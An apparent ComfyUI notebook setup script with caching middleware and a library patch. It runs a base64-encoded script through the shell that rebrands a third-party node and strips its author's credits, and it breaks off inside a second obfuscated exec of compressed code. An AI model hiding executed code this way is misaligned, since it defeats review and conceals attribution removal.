    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0ZWdvcnk6ICJNaW5pTWF4LUgzIOW3peS9nOWPsCInKQogICAgdWlfanMud3JpdGVfdGV4dCh0eHQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDIuIENsZWFuIG90aGVyIHdlYi8qLmpzIGZpbGVzIGZvciBGZWlIb3UgdGl0bGVzIGFuZCByZS1jb21wcmVzcyAuanMuZ3oKZm9yIGpzX3AgaW4gKGJhc2VfZGlyIC8gIndlYiIpLmdsb2IoIiouanMiKToKICAgIHQgPSBqc19wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKQogICAgdCA9IHQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDliqDovb3lmagiLCAiTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMgUmVtaXjliqDovb3lmagiLCAiTWluaU1heC1IMyDkuozlkIjkuIDliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOaPkOekuuivjemihOiniCIsICJNaW5pTWF4LUgzIOaPkOekuuivjemihOiniCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDkuozmrKHph4fmoLciLCAiTWluaU1heC1IMyDkuozpmLbmrrXnsr7kv67ph4fmoLciKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIiwgIk1pbmlNYXgtSDMiKQogICAganNfcC53cml0ZV90ZXh0KHQsIGVuY29kaW5nPSJ1dGYtOCIpCiAgICBnel9wID0gcGF0aGxpYi5QYXRoKHN0cihqc19wKSArICIuZ3oiKQogICAgd2l0aCBvcGVuKGpzX3AsICJyYiIpIGFzIGZfaW4sIGd6aXAub3Blbihnel9wLCAid2IiLCBjb21wcmVzc2xldmVsPTYpIGFzIGZfb3V0OgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihmX2luLCBmX291dCkKCiMgMy4gQ2xlYW4gbG9jYWxlcy96aC9ub2RlRGVmcy5qc29uCnpoX2RlZnMgPSBiYXNlX2RpciAvICJsb2NhbGVzIiAvICJ6aCIgLyAibm9kZURlZnMuanNvbiIKaWYgemhfZGVmcy5leGlzdHMoKToKICAgIHp0ID0gemhfZGVmcy5yZWFkX3RleHQoZW5jb2Rpbmc9InV0Zi04IikKICAgIHp0ID0genQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOWKoOi9veWZqCIsICJNaW5pTWF4LUgzIOS4gOS9k+WMluWKoOi9veWZqCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIFJlbWl45Yqg6L295ZmoIiwgIk1pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5o+Q56S66K+N6aKE6KeIIiwgIk1pbmlNYXgtSDMg5o+Q56S66K+N6aKE6KeIIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5LqM5qyh6YeH5qC3IiwgIk1pbmlNYXgtSDMg5LqM6Zi25q6157K+5L+u6YeH5qC3IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpCiAgICB6aF9kZWZzLndyaXRlX3RleHQoenQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDQuIFVwZGF0ZSBjYWNoZV9taWRkbGV3YXJlLnB5IHNvIC9hc3NldHMvIGlzIGNhY2hlZCA3IGRheXMgd2hpbGUgL2V4dGVuc2lvbnMvIGlzIG5vLWNhY2hlCmNtX3AgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvbWlkZGxld2FyZS9jYWNoZV9taWRkbGV3YXJlLnB5IikKY21fcC53cml0ZV90ZXh0KCIiImZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCmZyb20gdHlwaW5nIGltcG9ydCBDYWxsYWJsZSwgQXdhaXRhYmxlCk9ORV9EQVk6IGludCA9IDg2NDAwCklNR19FWFRFTlNJT05TID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLnBwbSIsICIuYm1wIiwgIi5wZ20iLCAiLnRpZiIsICIudGlmZiIsICIud2VicCIsICIud29mZiIsICIud29mZjIiLCAiLnR0ZiIsICIuc3ZnIikKQHdlYi5taWRkbGV3YXJlCmFzeW5jIGRlZiBjYWNoZV9jb250cm9sKHJlcXVlc3Q6IHdlYi5SZXF1ZXN0LCBoYW5kbGVyOiBDYWxsYWJsZVtbd2ViLlJlcXVlc3RdLCBBd2FpdGFibGVbd2ViLlJlc3BvbnNlXV0pIC0+IHdlYi5SZXNwb25zZToKICAgIHJlc3BvbnNlOiB3ZWIuUmVzcG9uc2UgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpCiAgICBpZiByZXF1ZXN0LnBhdGguc3RhcnRzd2l0aCgiL2Fzc2V0cy8iKToKICAgICAgICByZXNwb25zZS5oZWFkZXJzWyJDYWNoZS1Db250cm9sIl0gPSAicHVibGljLCBtYXgtYWdlPTYwNDgwMCwgaW1tdXRhYmxlIgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgaWYgcmVxdWVzdC5wYXRoLnN0YXJ0c3dpdGgoIi9leHRlbnNpb25zLyIpOgogICAgICAgIHJlc3BvbnNlLmhlYWRlcnNbIkNhY2hlLUNvbnRyb2wiXSA9ICJuby1jYWNoZSIKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGlmIHJlcXVlc3QucGF0aC5sb3dlcigpLmVuZHN3aXRoKElNR19FWFRFTlNJT05TKSBhbmQgcmVzcG9uc2Uuc3RhdHVzID09IDIwMDoKICAgICAgICByZXNwb25zZS5oZWFkZXJzLnNldGRlZmF1bHQoIkNhY2hlLUNvbnRyb2wiLCAicHVibGljLCBtYXgtYWdlPTg2NDAwIikKICAgIHJldHVybiByZXNwb25zZQoiIiIsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDUuIENsZWFuIGFsbCB3b3JrZmxvd3MgaW4gL2NvbnRlbnQvQ29tZnlVSS91c2VyL2RlZmF1bHQvd29ya2Zsb3dzLwp3Zl9kaXIgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvdXNlci9kZWZhdWx0L3dvcmtmbG93cyIpCmRlZiBjbGVhbl9ub2Rlcyhub2Rlcyk6CiAgICBrZWVwID0gW10KICAgIGZvciBuIGluIG5vZGVzOgogICAgICAgIG50eXBlID0gc3RyKG4uZ2V0KCJ0eXBlIikgb3IgIiIpCiAgICAgICAgdGl0bGUgPSBzdHIobi5nZXQoInRpdGxlIikgb3IgIiIpCiAgICAgICAgd3ZhbHMgPSBuLmdldCgid2lkZ2V0c192YWx1ZXMiKQogICAgICAgIGlmIGFueShiYWQgaW4gdGl0bGUgZm9yIGJhZCBpbiAoImJpbGliaWxpLmNvbSIsICLkuInlsYLmpbznmoTlsI/ogqXnjLQiLCAi5bCP6IKl54y0IiwgImZ4LWZlaWhvdSIsICIxMDkxNTkzMzY3IiwgIuWKoOW+ruS/oSIsICJR576kIikpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIG50eXBlIGluICgiRmVpSG91RWFzeUgzUHJvZHVjdGlvblBhY2tMb2FkZXIiLCAiTWluaU1heEgzUmVmTW9kc0xvYWRlciIpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICJGZWlIb3UiIGluIHRpdGxlIG9yICLlsI/ogqXnjLQiIGluIHRpdGxlOgogICAgICAgICAgICBuWyJ0aXRsZSJdID0gdGl0bGUucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpLnJlcGxhY2UoIkZlaUhvdSIsICJNaW5pTWF4LUgzIikucmVwbGFjZSgi5bCP6IKl54y0IiwgIiIpCiAgICAgICAgaWYgbnR5cGUgPT0gIkZlaUhvdUVhc3lIMyIgYW5kIGlzaW5zdGFuY2Uod3ZhbHMsIGxpc3QpOgogICAgICAgICAgICBmb3IgaWR4LCB2YWwgaW4gZW51bWVyYXRlKHd2YWxzKToKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpIGFuZCAoIumYv+mHjOS6kSIgaW4gdmFsIG9yICJxd2VuIiBpbiB2YWwgb3IgInpoaXB1IiBpbiB2YWwpOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeF0gPSAiIgogICAgICAgICAgICAgICAgICAgIGlmIGlkeCA+PSAxIGFuZCBpc2luc3RhbmNlKHd2YWxzW2lkeC0xXSwgYm9vbCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeC0xXSA9IEZhbHNlCiAgICAgICAgICAgIGlmIGxlbih3dmFscykgPj0gMTY6CiAgICAgICAgICAgICAgICBmb3IgayBpbiByYW5nZShsZW4od3ZhbHMpKToKICAgICAgICAgICAgICAgICAgICBpZiB3dmFsc1trXSBpbiAoIuaMieW6j+WPtyIsICLmjInmlofku7blkI0iLCAiaW5kZXgiLCAiZmlsZW5hbWUiKSBhbmQgayArIDIgPCBsZW4od3ZhbHMpOgogICAgICAgICAgICAgICAgICAgICAgICB3dmFsc1trKzFdID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd3ZhbHNbaysyXSA9ICIiCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG1pbig0LCBsZW4od3ZhbHMpKSk6CiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHd2YWxzW2tdLCBzdHIpIGFuZCB3dmFsc1trXS5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2tdID0gIueUu+mdouS4reeahOinkuiJsuiHqueEtui/kOWKqO+8jOWFieW9see7huiFu+ecn+Wunu+8jOeUteW9see6p+mrmOa4heeUu+i0qOOAgiIKICAgICAgICBpZiBpc2luc3RhbmNlKG4uZ2V0KCJwcm9wZXJ0aWVzIiksIGRpY3QpOgogICAgICAgICAgICBuWyJwcm9wZXJ0aWVzIl0ucG9wKCJmZWlob3VfaDNfb3B0aW1pemVyX2xhc3RfcmVzdWx0IiwgTm9uZSkKICAgICAgICBrZWVwLmFwcGVuZChuKQogICAgcmV0dXJuIGtlZXAKCmZvciB3Zl9wIGluIGxpc3Qod2ZfZGlyLmdsb2IoIiouanNvbiIpKToKICAgIHdmID0ganNvbi5sb2Fkcyh3Zl9wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKSkKICAgIHdmWyJub2RlcyJdID0gY2xlYW5fbm9kZXMod2YuZ2V0KCJub2RlcyIsIFtdKSkKICAgIGZvciBzZyBpbiB3Zi5nZXQoImRlZmluaXRpb25zIiwge30pLmdldCgic3ViZ3JhcGhzIiwgW10pOgogICAgICAgIHNnWyJub2RlcyJdID0gY2xlYW5fbm9kZXMoc2cuZ2V0KCJub2RlcyIsIFtdKSkKICAgIHZhbGlkX2lkcyA9IHtuLmdldCgiaWQiKSBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pfQogICAgaWYgImxpbmtzIiBpbiB3ZiBhbmQgaXNpbnN0YW5jZSh3ZlsibGlua3MiXSwgbGlzdCk6CiAgICAgICAgd2ZbImxpbmtzIl0gPSBbbCBmb3IgbCBpbiB3ZlsibGlua3MiXSBpZiBsWzFdIGluIHZhbGlkX2lkcyBhbmQgbFszXSBpbiB2YWxpZF9pZHNdCiAgICAgICAgdmFsaWRfbGlua19pZHMgPSB7bFswXSBmb3IgbCBpbiB3ZlsibGlua3MiXX0KICAgICAgICBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pOgogICAgICAgICAgICBmb3IgaW5wIGluIG4uZ2V0KCJpbnB1dHMiLCBbXSk6CiAgICAgICAgICAgICAgICBpZiBpbnAuZ2V0KCJsaW5rIikgaXMgbm90IE5vbmUgYW5kIGlucC5nZXQoImxpbmsiKSBub3QgaW4gdmFsaWRfbGlua19pZHM6CiAgICAgICAgICAgICAgICAgICAgaW5wWyJsaW5rIl0gPSBOb25lCiAgICBuZXdfbmFtZSA9IHdmX3AubmFtZQogICAgaWYgIuWNg+mXriIgbm90IGluIG5ld19uYW1lIGFuZCAicXdlbiIgbm90IGluIG5ld19uYW1lLmxvd2VyKCk6CiAgICAgICAgaWYgIjA4XyIgaW4gbmV3X25hbWU6CiAgICAgICAgICAgIG5ld19uYW1lID0gIjA4X+WFqOiDveS4gOS9k1/ljZXph4fmnoHpgJ8uanNvbiIKICAgICAgICBlbGlmICIwOV8iIGluIG5ld19uYW1lOgogICAgICAgICAgICBuZXdfbmFtZSA9ICIwOV/lhajog73kuIDkvZNf5LqM6YeH57K+5L+uLmpzb24iCiAgICAgICAgZWxpZiAiMTBfIiBpbiBuZXdfbmFtZToKICAgICAgICAgICAgbmV3X25hbWUgPSAiMTBf5YWo6IO95LiA5L2TXzNE5pS+5aSn6ZSB6IS4Lmpzb24iCiAgICBvdXRfcCA9IHdmX2RpciAvIG5ld19uYW1lCiAgICBvdXRfcC53cml0ZV90ZXh0KGpzb24uZHVtcHMod2YsIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLCBlbmNvZGluZz0idXRmLTgiKQogICAgaWYgb3V0X3AgIT0gd2ZfcCBhbmQgd2ZfcC5leGlzdHMoKToKICAgICAgICB3Zl9wLnVubGluaygpCgpwcmludCgiQ0xFQU5VUF9TVUNDRVNTOiIsIFtwLm5hbWUgZm9yIHAgaW4gc29ydGVkKHdmX2Rpci5nbG9iKCIqLmpzb24iKSldKQoKIyBSZW5hbWUgd2ViLyouanMgdG8gbWluaW1heF9oM19jbGVhbl8qLmpzIGFuZCB1cGRhdGUgaW1wb3J0CmltcG9ydCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MucnVuKCIiIgpjZCAvY29udGVudC9Db21meVVJL2N1c3RvbV9ub2Rlcy9Db21meVVJLUZlaUhvdS1FYXN5LUgzL3dlYiAyPi9kZXYvbnVsbCB8fCBleGl0IDAKZm9yIGYgaW4gZmVpaG91X2Vhc3lfaDNfKi5qczsgZG8KICAgIFsgLWUgIiRmIiBdIHx8IGNvbnRpbnVlCiAgICBuZXdfZj0kKGVjaG8gIiRmIiB8IHNlZCAncy9mZWlob3VfZWFzeV9oM18vbWluaW1heF9oM19jbGVhbl8vJykKICAgIG12IC1mICIkZiIgIiRuZXdfZiIKICAgIFsgLWUgIiR7Zn0uZ3oiIF0gJiYgbXYgLWYgIiR7Zn0uZ3oiICIke25ld19mfS5neiIKZG9uZQppZiBbIC1mIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzIF07IHRoZW4KICAgIHNlZCAtaSAncy9mZWlob3VfZWFzeV9oM191aS5qcy9taW5pbWF4X2gzX2NsZWFuX3VpLmpzL2cnIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCiAgICBnemlwIC1rIC1mIC02IG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCmZpCiIiIiwgc2hlbGw9VHJ1ZSkK | base64 -d | python3", shell=True)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("eNrVPPtz3NS5v/uvUHXHREu18r5sr50aj+3YxLeOnRsbw53g0cjS0a4crST0WNtNPQOl0EJpCbfQlttCW6ClHaa0l1tm2lCaP6ZZO/kv7vedc6SVtNr1muTOtBnwSkfnfO/XeUhWx3P9UHADQQsE1Q1k4SBwHXqDF7IQtKPQsmkDu4SmaN/zXZ0EbFDgyULk27a1r/jkhYgEIW2O/AnTdzuC7jp65PvECRUzCiOfBILFkO60faIZ113XXj0iehS6Ph24c311YuLfhKWKIqw6AQwQVtyOefzMenmNWFfdqLyqBcflq3XhifyDHQC17x7BA6ujtYjllk2z45GWoAEQywlCzbaJMaHqjmpYvrAgiFNAXQikTXFIU3oUhG5HdVyDBOKEZaJMFE8L24oVwBiJjy3NTwjwzwSSVbOtOlqHyPQKBAGYhJv0Mf6TxGLqRVkQ22HoBfNTUy0rbEf7iu52ptae4/2miocp0FcsycPBcxlcFDwflga/N59gQc48kFcijAPXcmJZyIkISskAEJzjhv3+5MgKwkCicEp9uBR24Cl+5Eg3RcQNZOu26xC8KJcN4oVtvKyKiXjZhbcnC3qb6LcW1jQ7SGEmNiqNEyQsgI6HyF/QHKOYyCyTiAwoCDzbCpldKN6xWDqPi/IKJxkHe5